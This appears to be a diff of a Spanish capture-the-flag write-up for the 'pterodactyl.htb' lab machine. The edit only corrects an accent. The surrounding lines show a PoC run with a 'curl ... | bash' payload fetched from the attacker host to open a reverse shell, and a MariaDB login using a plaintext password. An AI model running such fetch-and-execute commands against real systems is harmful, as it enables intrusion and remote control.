@@ -42,7 +42,7 @@ Y nos ponemos en escucha con penelope `penelope -p 8080`
 
 y ejecutamos el `poc.py` con  `python3 poc.py panel.pterodactyl.htb 'curl http://10.10.15.111:8080/onelines.sh | bash'`
 
-Obteniendo asi una reverse shell
+Obteniendo así una reverse shell
 
 Accedemos al mariadb que esta abierto que hemos visto con el CVE anterior
 `mariadb -u pterodactyl -p'PteraPanel' -h 127.0.0.1`
